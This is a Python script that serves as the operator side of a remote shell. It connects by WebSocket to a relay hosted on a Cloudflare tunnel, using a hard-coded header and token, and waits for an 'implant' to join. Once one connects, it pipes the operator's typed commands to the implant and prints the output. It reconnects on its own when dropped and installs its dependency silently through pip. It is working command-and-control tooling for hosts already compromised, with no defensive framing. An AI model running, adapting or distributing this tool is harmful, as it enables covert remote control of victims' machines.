#!/usr/bin/env python3
import asyncio, sys, os
try:
    import websockets
except ImportError:
    os.system("pip install websockets -q")
    import websockets

WORKER_URL = "wss://sunday-jewelry-biggest-sets.trycloudflare.com/?r=l"
AUTH_HEADER = "X-Request-ID"
AUTH_TOKEN = "g0ivBa8uzZtHGioDOW7s"

async def main():
    print(f"[*] Connecting to relay: {WORKER_URL}")
    headers = {AUTH_HEADER: AUTH_TOKEN}

    while True:
        try:
            async with websockets.connect(WORKER_URL, additional_headers=headers) as ws:
                print("[+] Connected to relay. Waiting for implant...")
                loop = asyncio.get_event_loop()

                async def read_stdin():
                    while True:
                        line = await loop.run_in_executor(None, sys.stdin.readline)
                        if not line:
                            break
                        await ws.send(line)

                async def write_stdout():
                    async for msg in ws:
                        if isinstance(msg, bytes):
                            msg = msg.split(b'\x00', 1)[0]
                            os.write(sys.stdout.fileno(), msg)
                        else:
                            msg = msg.split('\x00', 1)[0]
                            sys.stdout.write(msg)
                            sys.stdout.flush()

                await asyncio.gather(read_stdin(), write_stdout())
        except (websockets.ConnectionClosed, ConnectionRefusedError, OSError) as e:
            print(f"\n[*] Disconnected ({e}), reconnecting in 3s...")
            await asyncio.sleep(3)

if __name__ == "__main__":
    asyncio.run(main())
